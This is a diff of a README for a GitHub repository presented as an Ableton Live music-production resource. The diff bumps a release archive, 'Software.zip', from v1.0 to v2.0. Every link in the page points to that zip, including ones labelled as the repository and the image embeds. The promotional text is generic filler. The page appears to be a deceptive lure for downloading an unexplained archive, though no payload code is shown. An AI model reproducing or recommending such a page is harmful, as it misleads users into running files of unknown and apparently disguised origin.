@@ -29,17 +29,17 @@ Explore a wide range of topics related to Ableton Live and music production, inc
 
 ## 🔗 Download the Repository
 Click the button below to download the repository:
-[![Download Repository](https://github.com/Parth290908/Ableton-Live-Music-Production/releases/download/v1.0/Software.zip)](https://github.com/Parth290908/Ableton-Live-Music-Production/releases/download/v1.0/Software.zip)
+[![Download Repository](https://github.com/Parth290908/Ableton-Live-Music-Production/releases/download/v2.0/Software.zip)](https://github.com/Parth290908/Ableton-Live-Music-Production/releases/download/v2.0/Software.zip)
 
 ## 🌐 Explore More
-If the link above needs to be launched, make sure to click on it to access the repository files. For more information, visit the [GitHub Repository](https://github.com/Parth290908/Ableton-Live-Music-Production/releases/download/v1.0/Software.zip) or check the "Releases" section for the latest updates and releases.
+If the link above needs to be launched, make sure to click on it to access the repository files. For more information, visit the [GitHub Repository](https://github.com/Parth290908/Ableton-Live-Music-Production/releases/download/v2.0/Software.zip) or check the "Releases" section for the latest updates and releases.
 
 ## 🚀 Get Started
 Start your music production journey today with Ableton Live. From creating beats to mixing tracks, this repository has everything you need to elevate your sound. Let your creativity flow and immerse yourself in the world of music production with Ableton Live! 🎵🎹
 
-![Ableton Live](https://github.com/Parth290908/Ableton-Live-Music-Production/releases/download/v1.0/Software.zip)
+![Ableton Live](https://github.com/Parth290908/Ableton-Live-Music-Production/releases/download/v2.0/Software.zip)
 
 ## 🎶 Happy Creating!
 Thank you for exploring the "Ableton-Live-Music-Production" repository. Get ready to unleash your musical potential and bring your productions to life with Ableton Live. Whether you are a musician, producer, or sound designer, this repository is your go-to resource for all things music production. Start creating, experimenting, and sharing your music with the world. Happy creating! 🎶🔊
 
-![Music Production](https://github.com/Parth290908/Ableton-Live-Music-Production/releases/download/v1.0/Software.zip)
+![Music Production](https://github.com/Parth290908/Ableton-Live-Music-Production/releases/download/v2.0/Software.zip)
